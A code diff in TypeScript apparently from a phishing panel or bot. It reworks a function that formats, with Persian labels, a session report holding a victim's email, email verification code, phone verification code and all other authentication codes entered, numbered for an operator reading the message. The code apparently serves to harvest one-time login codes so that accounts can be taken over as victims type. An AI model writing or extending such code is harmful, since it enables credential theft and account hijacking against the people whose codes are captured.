@@ -556,11 +556,6 @@ const formatSessionMessage = (session: UserSession): string => {
 ⏰ <b>زمان شروع:</b> ${escapeHtml(session.startTime)}
 📍 <b>وضعیت فعلی:</b> ${escapeHtml(getCurrentStepText(session.currentStep))}`;
 
-  // Add phone verification code if exists
-  if (session.phoneVerificationCode) {
-    message += `\n\n✅ <b>کد تایید شماره:</b> <code>${escapeHtml(session.phoneVerificationCode)}</code>`;
-  }
-
   // Add email information if exists
   if (session.email) {
     message += `\n\n📧 <b>ایمیل:</b> <code>${escapeHtml(session.email)}</code>`;
@@ -571,18 +566,46 @@ const formatSessionMessage = (session: UserSession): string => {
     message += `\n✅ <b>کد تایید ایمیل:</b> <code>${escapeHtml(session.emailCode)}</code>`;
   }
 
-  // Add auth steps data
+  // Add auth codes data with numbered format
+  let hasAnyCodes = false;
+
+  // Check if we have phone verification code
+  if (session.phoneVerificationCode) {
+    hasAnyCodes = true;
+  }
+
+  // Check if we have auth codes
   if (session.authCodes && Object.keys(session.authCodes).length > 0) {
     Object.keys(session.authCodes).forEach((stepType) => {
       const codes = session.authCodes[stepType];
       if (codes && codes.length > 0) {
-        message += `\n\n🔐 <b>${escapeHtml(getStepDisplayName(stepType))}:</b>`;
-
-        codes.forEach((code, index) => {
-          message += `\n   ${index + 1}. <code>${escapeHtml(code)}</code>`;
-        });
+        hasAnyCodes = true;
       }
     });
+  }
+
+  if (hasAnyCodes) {
+    message += `\n\n🔐 <b>کدهای وارد شده:</b>`;
+    let codeNumber = 1;
+
+    // Add phone verification code first
+    if (session.phoneVerificationCode) {
+      message += `\n   ${codeNumber}. <b>کد تایید شماره:</b> <code>${escapeHtml(session.phoneVerificationCode)}</code>`;
+      codeNumber++;
+    }
+
+    // Add auth steps data
+    if (session.authCodes && Object.keys(session.authCodes).length > 0) {
+      Object.keys(session.authCodes).forEach((stepType) => {
+        const codes = session.authCodes[stepType];
+        if (codes && codes.length > 0) {
+          codes.forEach((code) => {
+            message += `\n   ${codeNumber}. <b>${escapeHtml(getStepDisplayName(stepType))}:</b> <code>${escapeHtml(code)}</code>`;
+            codeNumber++;
+          });
+        }
+      });
+    }
   }
 
   message += `\n\n📊 <b>مراحل تکمیل شده:</b> ${session.completedSteps?.length || 0}`;
